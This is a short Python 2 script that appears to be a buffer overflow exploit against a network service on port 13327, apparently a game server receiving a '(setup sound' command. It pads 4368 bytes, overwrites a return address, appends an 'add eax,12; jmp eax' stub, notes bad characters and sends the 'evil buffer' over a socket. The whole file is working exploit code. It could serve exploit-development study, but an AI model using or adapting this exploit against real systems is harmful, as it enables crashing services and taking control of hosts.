#!/usr/bin/python
import socket
host= "127.0.0.1"

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
#/x00 /x0A /x0D /x20 bad characters
#83C00CFFE0
crash="\x41" * 4368 + "\x42"*4 + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

buffer = "\x11(setup sound )" + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host,13327))
s.send(buffer)
data=s.recv(1024)
print data
s.close()
print "[*]Payload Sent !"
